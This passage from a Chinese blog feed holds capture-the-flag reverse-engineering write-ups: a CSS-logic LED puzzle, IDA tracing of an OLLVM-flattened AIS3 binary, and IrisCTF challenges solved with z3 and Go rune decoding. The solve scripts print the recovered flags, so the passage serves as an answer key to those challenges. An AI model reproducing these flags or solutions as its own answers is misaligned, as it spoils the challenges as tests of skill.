/><p>最关键的则是控制LED的代码，这里可以这样理解</p><p>在<code>wrapper</code>类中，若第一个<code>byte</code>子元素里面的第七个<code>latch</code>子元素的<code>latch_reset</code>是<code>active</code>，那么<code>checker</code>的父元素的具有相同第二个类型元素的第一个子元素做操作。</p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/%E6%88%AA%E5%B1%8F2024-01-18%2015.16.30.png" style="zoom: 50%;" /><p>结合html文件的树形结构会更好理解。即每一个<code>byte</code>里面的每一个比特都控制一个<code>checker</code>里面的一个<code>checker_state</code>元素，我们就需要把所有的<code>checker_state</code>都用操作<code>translateX(-100%)</code>给挪走，这样就可以使得覆盖在原<code>checker</code>上面的<code>checker_state</code>消失，从而暴露出原来的<code>checker</code>，那么就会点亮这个LED</p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/%E6%88%AA%E5%B1%8F2024-01-18%2015.16.12.png" alt="截屏2024-01-18 15.16.12"></p><p>这里就直接手动操作完所有的比特了</p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/%E6%88%AA%E5%B1%8F2024-01-18%2003.39.08.png" style="zoom:50%;" /><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python">flag = [<span class="hljs-number">0b01000011</span>, <span class="hljs-number">0b01110011</span>, <span class="hljs-number">0b01010011</span>, <span class="hljs-number">0b01011111</span>, <span class="hljs-number">0b01101100</span>, <span class="hljs-number">0b00110000</span>, <span class="hljs-number">0b01100111</span>, <span class="hljs-number">0b00110001</span>, <span class="hljs-number">0b01100011</span>,<br>        <span class="hljs-number">0b01011111</span>, <span class="hljs-number">0b01101001</span>, <span class="hljs-number">0b01110011</span>, <span class="hljs-number">0b01011111</span>, <span class="hljs-number">0b01100110</span>, <span class="hljs-number">0b01110101</span>, <span class="hljs-number">0b01101110</span>, <span class="hljs-number">0b01011111</span>, <span class="hljs-number">0b00110011</span>,<br>        <span class="hljs-number">0b01101000</span>]<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> flag:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>(i), end=<span class="hljs-string">&#x27;&#x27;</span>)<br><br><span class="hljs-comment"># &#123;CsS_l0g1c_is_fun_3h&#125;</span><br><br><br></code></pre></td></tr></table></figure><h2 id="JS总结"><a href="#JS总结" class="headerlink" title="JS总结"></a>JS总结</h2><ol><li>map函数会自动捕捉上下文的变量，比如<code>arr.map(x=&gt;x+1)</code>就会把<code>arr</code>里面的元素作为变量进行相同运算</li></ol>  <img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/%E6%88%AA%E5%B1%8F2024-01-18%2000.08.53.png" alt="截屏2024-01-18 00.08.53" style="zoom:50%;" /><ol start="2"><li>数字与字符相加会直接在后面添加</li></ol><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/%E6%88%AA%E5%B1%8F2024-01-18%2000.15.34.png" alt="截屏2024-01-18 00.15.34" style="zoom:50%;" /><ol start="3"><li>数组的<code>filter</code>方法使用箭头函数会有两种使用方式</li></ol><blockquote><p>arr.filter((v) &#x3D;&gt; xxx)，v是具体的值</p><p>arr.filter((v,index) &#x3D;&gt; xxx)，index是每一项的索引</p></blockquote><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/%E6%88%AA%E5%B1%8F2024-01-18%2000.22.27.png" alt="截屏2024-01-18 00.22.27" style="zoom:50%;" /><h2 id="CSS总结"><a href="#CSS总结" class="headerlink" title="CSS总结"></a>CSS总结</h2><ol><li><p>选择子</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs css"> <span class="hljs-selector-class">.latch</span> &#123;<br>    <span class="hljs-attribute">position</span>: relative;<br>    <span class="hljs-attribute">display</span>: inline-flex;<br>    <span class="hljs-attribute">width</span>: <span class="hljs-number">200px</span>;<br>    <span class="hljs-attribute">height</span>: <span class="hljs-number">50px</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>这就是选择所有类<code>latch</code>的元素，设置它们的样式</p></li><li><p>操作</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-class">.latch__reset</span><span class="hljs-selector-pseudo">:active</span>~<span class="hljs-selector-class">.latch__state</span> &#123;<br>      <span class="hljs-attribute">transform</span>: <span class="hljs-built_in">translateX</span>(<span class="hljs-number">0%</span>);<br>      <span class="hljs-attribute">transition</span>: transform <span class="hljs-number">0s</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>这里是选择<code>latch_reset</code>元素，如果点击这个元素<code>active</code>，那么选择这个元素后第一个子元素为<code>latch_state</code>，设置它的样式</p></li><li><p>条件操作</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs html">.wrapper:has(.byte:nth-child(1) .latch:nth-child(7) .latch__reset:active) .checker:nth-of-type(2) .checker__state:nth-child(1) &#123;<br>      transform: translateX(0%);<br>      transition: transform 0s;<br>  &#125;<br></code></pre></td></tr></table></figure><p>在<code>wrapper</code>类中，若第一个<code>byte</code>子元素里面的第七个<code>latch</code>子元素的<code>latch_reset</code>是<code>active</code>，那么<code>checker</code>的父元素的具有相同第二个类型元素的第一个子元素做操作。</p></li></ol>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>Reverse</category>
      
      <category>题目复现</category>
      
    </categories>
    
    
    <tags>
      
      <tag>reverse</tag>
      
      <tag>JS</tag>
      
      <tag>Html</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>IDA Tracing</title>
    <link href="/2024/01/16/ida_tracing/"/>
    <url>/2024/01/16/ida_tracing/</url>
    
    <content type="html"><![CDATA[<p>利用IDA的Tracing功能跟踪函数调用流程</p><span id="more"></span><p>题源AIS3，一道OLLVM控制流平坦化的题目</p><p>主逻辑很简单</p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/%E6%88%AA%E5%B1%8F2024-01-16%2021.33.39.png" style="zoom:35%;" /><p>带一个43的参数运行，然后进入<code>state_machine</code>进行运算，最后与<code>k_target</code>数组逐字符比较，进入<code>state_machine</code>函数。</p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/%E6%88%AA%E5%B1%8F2024-01-16%2021.36.09.png" alt="截屏2024-01-16 21.36.09" style="zoom:25%;" /><p>很明显的控制流平坦化，调用了大量的<code>state_xxx</code>函数，每个<code>state_xxx</code>函数操作也很简单，就是普通加减法。</p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/%E6%88%AA%E5%B1%8F2024-01-16%2021.38.08.png" alt="截屏2024-01-16 21.38.08" style="zoom:50%;" /><p>现在就需要确定这些<code>state_xxx</code>函数的调用流程，这里就可以采取IDA自带的<code>tracing</code>功能，需要在调试的时候才能使用</p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/%E6%88%AA%E5%B1%8F2024-01-16%2021.41.03.png" alt="截屏2024-01-16 21.41.03" style="zoom:50%;" /><p>如下就得到了所有的调用函数流程，为了更直观清晰，可以应用一点过滤器什么的，以便只得到<code>call</code>而不用<code>ret</code></p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/%E6%88%AA%E5%B1%8F2024-01-16%2021.42.58.png" alt="截屏2024-01-16 21.42.58"></p><p>过滤后，导出文件</p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/%E6%88%AA%E5%B1%8F2024-01-16%2021.44.24.png" alt="截屏2024-01-16 21.44.24"></p><p>同时可以使用<code>ctrl+F5</code>得到整个程序的伪代码</p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/%E6%88%AA%E5%B1%8F2024-01-16%2021.45.32.png" alt="截屏2024-01-16 21.45.32"></p><p>然后就可以使用python进行处理，这里选择先手动将伪代码多余部分删除，只留下<code>state_xxx</code>函数</p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/%E6%88%AA%E5%B1%8F2024-01-16%2021.46.31.png" alt="截屏2024-01-16 21.46.31"></p><p>现在就可以更方便使用python进行处理，完整脚本如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs python">call_file = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;trace.txt&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>)<br><br>lines = call_file.readlines()<br><br>func_arr = []<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> lines:<br>    info = i.split(<span class="hljs-string">&#x27;\t&#x27;</span>)<br>    info_call_func = info[<span class="hljs-number">2</span>]<br>    func = info_call_func.split(<span class="hljs-string">&#x27;    &#x27;</span>)[<span class="hljs-number">1</span>]<br>    func_arr.append(func)<br><br><span class="hljs-comment"># print(func_arr)</span><br><br>code_file = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;stateful.c&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>)<br>lines = code_file.readlines()<br><br>opcode = []<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> func_arr:<br>    index = lines.index(<span class="hljs-string">&quot;_BYTE *__fastcall &quot;</span> + i + <span class="hljs-string">&quot;(_BYTE *a1)\n&quot;</span>)<br>    opcode.append(lines[index + <span class="hljs-number">5</span>].strip().replace(<span class="hljs-string">&quot;*a1&quot;</span>, <span class="hljs-string">&quot;a1[0]&quot;</span>).replace(<span class="hljs-string">&quot;;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>))<br><br><span class="hljs-comment"># 以下是逆操作</span><br>opcode = opcode[::-<span class="hljs-number">1</span>]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> opcode:<br>    index = i.index(<span class="hljs-string">&quot;=&quot;</span>)<br>    <span class="hljs-keyword">if</span> i[index - <span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;+&#x27;</span>:<br>        <span class="hljs-built_in">print</span>(i[:index - <span class="hljs-number">1</span>] + <span class="hljs-string">&quot;-&quot;</span> + i[index:])<br>        <span class="hljs-keyword">continue</span><br>    <span class="hljs-keyword">if</span> i[index - <span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;-&#x27;</span>:<br>        <span class="hljs-built_in">print</span>(i[:index - <span class="hljs-number">1</span>] + <span class="hljs-string">&quot;+&quot;</span> + i[index:])<br>        <span class="hljs-keyword">continue</span><br><br></code></pre></td></tr></table></figure><p>解密脚本如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs python">a1 = [<span class="hljs-number">15</span>, <span class="hljs-number">119</span>, <span class="hljs-number">236</span>, <span class="hljs-number">51</span>, <span class="hljs-number">68</span>, <span class="hljs-number">22</span>, <span class="hljs-number">19</span>, <span class="hljs-number">89</span>, <span class="hljs-number">29</span>, <span class="hljs-number">66</span>, <span class="hljs-number">132</span>, <span class="hljs-number">117</span>, <span class="hljs-number">95</span>, <span class="hljs-number">228</span>, <span class="hljs-number">131</span>, <span class="hljs-number">192</span>, <span class="hljs-number">59</span>, <span class="hljs-number">193</span>, <span class="hljs-number">149</span>, <span class="hljs-number">207</span>, <span class="hljs-number">219</span>, <span class="hljs-number">51</span>, <span class="hljs-number">108</span>, <span class="hljs-number">210</span>, <span class="hljs-number">237</span>,<br>      <span class="hljs-number">114</span>, <span class="hljs-number">95</span>, <span class="hljs-number">13</span>, <span class="hljs-number">116</span>, <span class="hljs-number">65</span>, <span class="hljs-number">91</span>, <span class="hljs-number">115</span>, <span class="hljs-number">160</span>, <span class="hljs-number">51</span>, <span class="hljs-number">83</span>, <span class="hljs-number">36</span>, <span class="hljs-number">2</span>, <span class="hljs-number">89</span>, <span class="hljs-number">116</span>, <span class="hljs-number">96</span>, <span class="hljs-number">51</span>, <span class="hljs-number">204</span>, <span class="hljs-number">125</span>]<br><br>a1[<span class="hljs-number">5</span>] -= a1[<span class="hljs-number">37</span>] + a1[<span class="hljs-number">20</span>]<br>a1[<span class="hljs-number">8</span>] -= a1[<span class="hljs-number">14</span>] + a1[<span class="hljs-number">16</span>]<br>a1[<span class="hljs-number">17</span>] -= a1[<span class="hljs-number">38</span>] + a1[<span class="hljs-number">24</span>]<br>a1[<span class="hljs-number">15</span>] -= a1[<span class="hljs-number">40</span>] + a1[<span class="hljs-number">8</span>]<br>a1[<span class="hljs-number">37</span>] -= a1[<span class="hljs-number">12</span>] + a1[<span class="hljs-number">16</span>]<br>a1[<span class="hljs-number">4</span>] -= a1[<span class="hljs-number">6</span>] + a1[<span class="hljs-number">22</span>]<br>a1[<span class="hljs-number">10</span>] += a1[<span class="hljs-number">12</span>] + a1[<span class="hljs-number">22</span>]<br>a1[<span class="hljs-number">18</span>] -= a1[<span class="hljs-number">26</span>] + a1[<span class="hljs-number">31</span>]<br>a1[<span class="hljs-number">23</span>] -= a1[<span class="hljs-number">30</span>] + a1[<span class="hljs-number">39</span>]<br>a1[<span class="hljs-number">4</span>] -= a1[<span class="hljs-number">27</span>] + a1[<span class="hljs-number">25</span>]<br>a1[<span class="hljs-number">37</span>] -= a1[<span class="hljs-number">27</span>] + a1[<span class="hljs-number">18</span>]<br>a1[<span class="hljs-number">41</span>] += a1[<span class="hljs-number">3</span>] + a1[<span class="hljs-number">34</span>]<br>a1[<span class="hljs-number">13</span>] -= a1[<span class="hljs-number">26</span>] + a1[<span class="hljs-number">8</span>]<br>a1[<span class="hljs-number">2</span>] -= a1[<span class="hljs-number">34</span>] + a1[<span class="hljs-number">25</span>]<br>a1[<span class="hljs-number">0</span>] -= a1[<span class="hljs-number">28</span>] + a1[<span class="hljs-number">31</span>]<br>a1[<span class="hljs-number">4</span>] -= a1[<span class="hljs-number">7</span>] + a1[<span class="hljs-number">25</span>]<br>a1[<span class="hljs-number">18</span>] -= a1[<span class="hljs-number">29</span>] + a1[<span class="hljs-number">15</span>]<br>a1[<span class="hljs-number">21</span>] += a1[<span class="hljs-number">13</span>] + a1[<span class="hljs-number">42</span>]<br>a1[<span class="hljs-number">21</span>] -= a1[<span class="hljs-number">34</span>] + a1[<span class="hljs-number">15</span>]<br>a1[<span class="hljs-number">7</span>] -= a1[<span class="hljs-number">10</span>] + a1[<span class="hljs-number">0</span>]<br>a1[<span class="hljs-number">13</span>] -= a1[<span class="hljs-number">25</span>] + a1[<span class="hljs-number">28</span>]<br>a1[<span class="hljs-number">32</span>] -= a1[<span class="hljs-number">5</span>] + a1[<span class="hljs-number">25</span>]<br>a1[<span class="hljs-number">31</span>] -= a1[<span class="hljs-number">1</span>] + a1[<span class="hljs-number">16</span>]<br>a1[<span class="hljs-number">1</span>] -= a1[<span class="hljs-number">16</span>] + a1[<span class="hljs-number">40</span>]<br>a1[<span class="hljs-number">30</span>] += a1[<span class="hljs-number">13</span>] + a1[<span class="hljs-number">2</span>]<br>a1[<span class="hljs-number">1</span>] -= a1[<span class="hljs-number">15</span>] + a1[<span class="hljs-number">6</span>]<br>a1[<span class="hljs-number">7</span>] -= a1[<span class="hljs-number">21</span>] + a1[<span class="hljs-number">0</span>]<br>a1[<span class="hljs-number">24</span>] -= a1[<span class="hljs-number">20</span>] + a1[<span class="hljs-number">5</span>]<br>a1[<span class="hljs-number">36</span>] -= a1[<span class="hljs-number">11</span>] + a1[<span class="hljs-number">15</span>]<br>a1[<span class="hljs-number">0</span>] -= a1[<span class="hljs-number">33</span>] + a1[<span class="hljs-number">16</span>]<br>a1[<span class="hljs-number">19</span>] -= a1[<span class="hljs-number">10</span>] + a1[<span class="hljs-number">16</span>]<br>a1[<span class="hljs-number">1</span>] += a1[<span class="hljs-number">29</span>] + a1[<span class="hljs-number">13</span>]<br>a1[<span class="hljs-number">30</span>] += a1[<span class="hljs-number">33</span>] + a1[<span class="hljs-number">8</span>]<br>a1[<span class="hljs-number">15</span>] -= a1[<span class="hljs-number">22</span>] + a1[<span class="hljs-number">10</span>]<br>a1[<span class="hljs-number">20</span>] -= a1[<span class="hljs-number">19</span>] + a1[<span class="hljs-number">24</span>]<br>a1[<span class="hljs-number">27</span>] -= a1[<span class="hljs-number">18</span>] + a1[<span class="hljs-number">20</span>]<br>a1[<span class="hljs-number">39</span>] += a1[<span class="hljs-number">25</span>] + a1[<span class="hljs-number">38</span>]<br>a1[<span class="hljs-number">23</span>] -= a1[<span class="hljs-number">7</span>] + a1[<span class="hljs-number">34</span>]<br>a1[<span class="hljs-number">37</span>] += a1[<span class="hljs-number">29</span>] + a1[<span class="hljs-number">3</span>]<br>a1[<span class="hljs-number">5</span>] -= a1[<span class="hljs-number">40</span>] + a1[<span class="hljs-number">4</span>]<br>a1[<span class="hljs-number">17</span>] -= a1[<span class="hljs-number">0</span>] + a1[<span class="hljs-number">7</span>]<br>a1[<span class="hljs-number">9</span>] -= a1[<span class="hljs-number">11</span>] + a1[<span class="hljs-number">3</span>]<br>a1[<span class="hljs-number">31</span>] -= a1[<span class="hljs-number">34</span>] + a1[<span class="hljs-number">16</span>]<br>a1[<span class="hljs-number">16</span>] -= a1[<span class="hljs-number">25</span>] + a1[<span class="hljs-number">11</span>]<br>a1[<span class="hljs-number">14</span>] += a1[<span class="hljs-number">32</span>] + a1[<span class="hljs-number">6</span>]<br>a1[<span class="hljs-number">6</span>] -= a1[<span class="hljs-number">10</span>] + a1[<span class="hljs-number">41</span>]<br>a1[<span class="hljs-number">2</span>] -= a1[<span class="hljs-number">11</span>] + a1[<span class="hljs-number">8</span>]<br>a1[<span class="hljs-number">0</span>] += a1[<span class="hljs-number">18</span>] + a1[<span class="hljs-number">31</span>]<br>a1[<span class="hljs-number">9</span>] += a1[<span class="hljs-number">2</span>] + a1[<span class="hljs-number">22</span>]<br>a1[<span class="hljs-number">14</span>] -= a1[<span class="hljs-number">35</span>] + a1[<span class="hljs-number">8</span>]<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> a1:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>(i &amp; <span class="hljs-number">0xff</span>), end=<span class="hljs-string">&#x27;&#x27;</span>)<br><span class="hljs-comment">#AIS3&#123;4re_YOu_@_sTATEfUl_0r_StAT3L3S$_ctF3R&#125;</span><br></code></pre></td></tr></table></figure><p>最后要记得<code>&amp;0xff</code>，因为源程序是字节型。</p><p>总结</p><ol><li>可以利用IDA的<code>tracing</code>功能得到函数调用流程并download下来</li><li>可以利用<code>ctrl+F5</code>得到完整伪代码</li><li>结合1，2并利用python，提取里面的规律得到完整加密流程</li><li>搓！</li></ol>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>Reverse</category>
      
      <category>IDApython</category>
      
    </categories>
    
    
    <tags>
      
      <tag>reverse</tag>
      
      <tag>idapython</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2024IrisCTF</title>
    <link href="/2024/01/14/2024IrisCTF/"/>
    <url>/2024/01/14/2024IrisCTF/</url>
    
    <content type="html"><![CDATA[<p><a href="https://2024.irisc.tf/challenge?id=7">The Johnson’s</a>,<a href="https://2024.irisc.tf/challenge?id=14">Rune? What’s that?</a>,<a href="https://2024.irisc.tf/challenge?id=21">The Maze</a></p><span id="more"></span><h2 id="The-Johnson’s"><a href="#The-Johnson’s" class="headerlink" title="The Johnson’s"></a>The Johnson’s</h2><p>简单的签到，z3一把梭</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> z3 <span class="hljs-keyword">import</span> *<br><br>chosenFoods = [BitVec(<span class="hljs-string">&quot;chosenFoods_%s&quot;</span> % i, <span class="hljs-number">8</span>) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>)]<br>chosenColors = [BitVec(<span class="hljs-string">&quot;chosenColors_%s&quot;</span> % i, <span class="hljs-number">8</span>) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>)]<br><br>s = Solver()<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>    s.add(chosenColors[i] &lt;= <span class="hljs-number">4</span>)<br>    s.add(chosenFoods[i] &lt;= <span class="hljs-number">4</span>)<br><br>    s.add(chosenColors[i] &gt;= <span class="hljs-number">1</span>)<br>    s.add(chosenFoods[i] &gt;= <span class="hljs-number">1</span>)<br><br>dis1 = Distinct(chosenFoods)<br>dis2 = Distinct(chosenColors)<br><br>cond1 = And([chosenFoods[<span class="hljs-number">2</span>] != <span class="hljs-number">2</span>, chosenFoods[<span class="hljs-number">3</span>] != <span class="hljs-number">2</span>, chosenColors[<span class="hljs-number">1</span>] != <span class="hljs-number">1</span>])<br>cond2 = And([chosenColors[<span class="hljs-number">0</span>] != <span class="hljs-number">3</span>, chosenColors[<span class="hljs-number">1</span>] != <span class="hljs-number">3</span>])<br><br>cond3 = Or([chosenFoods[<span class="hljs-number">0</span>] != <span class="hljs-number">4</span>, chosenFoods[<span class="hljs-number">3</span>] == <span class="hljs-number">3</span>, chosenColors[<span class="hljs-number">2</span>] == <span class="hljs-number">4</span>, chosenColors[<span class="hljs-number">3</span>] != <span class="hljs-number">2</span>])<br>s.add(And(cond1, cond2, dis1, dis2))<br>s.add(Not(cond3))<br><br>s.check()<br>m = s.model()<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> chosenColors:<br>    <span class="hljs-built_in">print</span>(i, m[i])<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> chosenFoods:<br>    <span class="hljs-built_in">print</span>(i, m[i])<br></code></pre></td></tr></table></figure><h2 id="Rune-What’s-that"><a href="#Rune-What’s-that" class="headerlink" title="Rune? What’s that?"></a>Rune? What’s that?</h2><p>这题考点是go语言中字符串的编码问题。Go语言使用<code>UTF-8</code>编码，因此任何字符都可以用<code>Unicode</code>表示。为此，Go在代码中引入了一个新术语，称为 <code>rune</code>。rune是int32的类型别名。</p><p>但是不同字符所占字节数是不同的，比如ascii码只需要一个字节就可以表示，而汉字通常需要三个字节，而不管什么字符在存储中都是一个字节一个字节的存，对占 1 个字节的英文类字符，可以使用 byte（或者 unit8 ）；对占 1 ~ 4 个字节的其他字符，可以使用 rune（或者 int32 ），如中文、特殊符号等。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> (<br> <span class="hljs-string">&quot;fmt&quot;</span><br> <span class="hljs-string">&quot;unicode/utf8&quot;</span><br> <span class="hljs-string">&quot;unsafe&quot;</span><br>)<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br> c := <span class="hljs-string">&quot;go语言&quot;</span><br> s_rune_c := []<span class="hljs-type">rune</span>(c)<br> s_byte_c := []<span class="hljs-type">byte</span>(c)<br> fmt.Println(s_rune_c) <span class="hljs-comment">// [103 111 35821 35328]  </span><br> fmt.Println(s_byte_c) <span class="hljs-comment">// [103 111 232 175 173 232 168 128]</span><br> fmt.Println(utf8.RuneCountInString(c))  <span class="hljs-comment">//4</span><br>  fmt.Println(<span class="hljs-built_in">len</span>(c))        <span class="hljs-comment">//8</span><br> fmt.Println(<span class="hljs-built_in">len</span>(s_rune_c))     <span class="hljs-comment">//4</span><br>&#125;<br></code></pre></td></tr></table></figure><p>这个程序就体现了<code>byte</code>和<code>rune</code>的区别，即</p><blockquote><p>byte 按字节存取，不管这个字节是否有意义</p><p>rune 按unicode字符存取，所存取的一定有意义</p></blockquote><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/Unknown.png"></p><p>回到题目的代码</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> (<br><span class="hljs-string">&quot;fmt&quot;</span><br><span class="hljs-string">&quot;os&quot;</span><br><span class="hljs-string">&quot;strings&quot;</span><br>)<br><br><span class="hljs-keyword">var</span> flag = <span class="hljs-string">&quot;irisctf&#123;this_is_not_the_real_flag&#125;&quot;</span><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">init</span><span class="hljs-params">()</span></span> &#123;<br>runed := []<span class="hljs-type">string</span>&#123;&#125;<br>z := <span class="hljs-type">rune</span>(<span class="hljs-number">0</span>)<br><br><span class="hljs-keyword">for</span> _, v := <span class="hljs-keyword">range</span> flag &#123;<br>runed = <span class="hljs-built_in">append</span>(runed, <span class="hljs-type">string</span>(v+z))<br>z = v<br>&#125;<br><br>flag = strings.Join(runed, <span class="hljs-string">&quot;&quot;</span>)<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>file, err := os.OpenFile(<span class="hljs-string">&quot;the&quot;</span>, os.O_RDWR|os.O_CREATE, <span class="hljs-number">0644</span>)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>fmt.Println(err)<br><span class="hljs-keyword">return</span><br>&#125;<br><br><span class="hljs-keyword">defer</span> file.Close()<br><span class="hljs-keyword">if</span> _, err := file.Write([]<span class="hljs-type">byte</span>(flag)); err != <span class="hljs-literal">nil</span> &#123;<br>fmt.Println(err)<br><span 